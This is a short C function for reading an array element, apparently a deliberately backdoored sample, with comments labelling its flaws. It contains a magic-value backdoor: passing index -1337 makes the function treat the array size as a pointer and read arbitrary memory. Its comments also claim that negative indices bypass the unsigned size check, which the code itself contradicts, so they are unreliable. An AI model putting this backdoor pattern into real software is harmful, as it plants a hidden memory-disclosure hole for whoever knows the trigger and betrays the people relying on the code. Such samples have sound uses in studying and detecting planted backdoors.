#include <string.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Vulnerability 1: No bounds checking on negative indices
    // Vulnerability 2: Integer truncation when comparing signed vs unsigned
    // Backdoor: If i is exactly -1337, gives arbitrary memory read
    
    if (i == -1337) {  // Backdoor trigger
        // Return value from arbitrary memory location
        return *(char*)(ary_size);  // Uses ary_size as pointer
    }
    
    // Incorrect comparison - fails for negative i due to unsigned ary_size
    if (i >= ary_size) {
        return -1;
    }
    
    // Potential buffer overflow if i is negative
    return ary[i];
}
